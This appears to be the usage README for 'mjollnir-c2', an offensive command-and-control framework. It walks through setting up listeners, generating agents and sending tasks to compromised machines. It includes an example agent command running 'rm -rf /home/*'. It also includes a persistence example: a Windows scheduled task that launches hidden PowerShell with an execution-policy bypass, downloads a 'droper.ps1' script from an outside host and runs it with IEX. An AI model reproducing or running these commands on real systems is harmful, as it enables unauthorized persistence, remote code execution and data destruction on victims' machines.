First construct the sqlite database:

```
$ cd mjollnir-c2-pub
$ python3
>>> from mjollnir_api import db, create_app
>>> db.create_all(app=create_app())
```

Then modify the config.json file to suit your needs.

Then start the api:

```
$ cd mjollnir-c2-pub
$ export FLASK_DEBUG=1
$ export FLASK_APP=mjollnir_api
$ flask run -h 0.0.0.0 -p 5000
```

Eventually start the cli:

```
$ cd mjollnir-c2-pub/mjollnir_cli
$ python mjollnir-cli.py
```

In order to use mjollnir-c2, you need to authenticate first. And so, you need a user and a password.
The first thing you may want to do is create a user/password:

```
Mjollnir > first_user
```

# Login/Logout into the mjollnir api

```
Mjollnir > login <username>
Mjollnir > logout
```

# Missions

First, create a mission

```
Mjollnir > mission -c <mission_name>
```

Not usefull yet, but soon you will be able to manage campaign

# Listener

There is a __listener menu__ that can be accessed using:

```
Mjollnir > listener
```

Then you have other commands:

```
Mjollnir > list (list all available listeners)
Mjollnir > use <listener_name> (use a listener based on its name)
Mjollnir > info (get some infos about the selected listener)
Mjollnir > set PORT 5555
Mjollnir > start (start the selected listener)
```

Then you could list all your started listeners using:

```
Mjollnir > listener -l
```

# Agent

There is a __agent menu__ that can be accessed using:

```
Mjollnir > agent
```

Then you have other commands:

```
Mjollnir > list (list all available agents)
Mjollnir > use <agent_name> (use an agent based on its name)
Mjollnir > set RPORT 5555
Mjollnir > generate (generate on the fly the selected agent)
```

Then you could list all your active agents using:

```
Mjollnir > agent -l
```

You could interact with an agent using:

```
Mjollnir > agent -i <agent_uid>
Mjollnir > CMD whoami; touch hello; rm -rf /home/* (read carrefully before copy-paste)
Mjollnir > group <new_group_name>
```

You will see that the task has been submitted. If the result is too long to get, you could grab it later using:

```
Mjollnir > task -r <task_uid>
```

# On registering task

There is a __on registering task menu__ that can be accessed using:

```
Mjollnir > r-task
```

This menu allows to set a task as soon as an agent registers.

For this you need the agent name. So before you would like to:

```
Mjollnir > agent
Mjollnir > list
```

Then for example set a scheduled task like:
```
CMD SCHTASKS /CREATE /SC DAILY /TN "MyTasks\my task" /TR "powershell.exe -ep bypass -w 1 -nop $e=(New-Object System.Net.WebClient).DownloadString(\\\"http://192.168.0.129:5000/publi
c/droper.ps1\\\");IEX $e" /ST 9:21
```

# Group task

It is possible to submit a task for all your agents with the group __group_name__

```
Mjollnir > g-task
```





